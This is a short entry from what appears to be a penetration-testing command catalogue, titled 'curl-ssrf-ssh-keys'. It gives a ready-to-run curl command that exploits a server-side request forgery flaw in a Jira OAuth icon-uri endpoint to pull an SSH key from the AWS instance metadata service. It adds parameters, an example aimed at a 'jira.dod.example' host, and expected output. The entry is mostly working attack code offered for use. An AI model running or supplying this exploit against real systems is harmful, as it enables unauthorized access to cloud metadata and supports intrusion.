---
data: >-
  curl
  "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key"
tags:
  - ssrf
  - aws
  - ssh
type: command
output: ssh-rsa AAAAB3NzaC1yc2E...
executor: bash
platforms:
  - Linux
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.282Z'
id: f1f72868-8bcf-4611-aa54-8e990cac6ff8
verified: false
validated: true
submitted: true
---
# curl-ssrf-ssh-keys

## Command

```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key"
```

## Description

Retrieves the first SSH public key from metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target-domain` | Vulnerable app domain | Yes |
| `0` | Key index (0 for first) | Yes |

## Examples

### Basic Usage

```bash
curl "https://jira.dod.example/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key"
```

## Expected Output

SSH public key string.

## Related

- [[Related Procedure: Retrieve-AWS-Instance-Metadata-via-SSRF]]
